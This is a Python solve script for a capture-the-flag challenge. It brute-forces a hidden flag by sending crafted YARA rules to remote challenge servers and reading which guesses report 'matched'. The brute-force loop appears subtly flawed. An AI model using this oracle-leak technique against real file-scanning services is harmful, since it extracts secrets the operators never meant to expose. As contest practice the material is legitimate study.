#!/usr/bin/env python3

from pwn import *

payload1 = """rule ctf4b {
    strings:
        $ctf4b = \""""
FLAG = "ctf4b{"
payload2 = """\"    condition:
        $ctf4b
}

"""
payload = payload1 + FLAG + payload2

io = remote("yaro-2.beginners.seccon.games", 5003)

io.recv()
io.send(payload)
io.recv()
while True:
    for i in range(32,126):
        io = remote("yaro.beginners.seccon.games", 5003)
        io.recv()
        FLAG += chr(i)
        payload = payload1 + FLAG + payload2
        io.send(payload)
        result = io.recv().decode('utf-8')
        #print(result)
        if "matched" in result:
            io.close()
            print(FLAG)
        else:
            FLAG = FLAG[0:len(FLAG)-1]
            io.close()
            continue
        if len(FLAG)>50:
            break
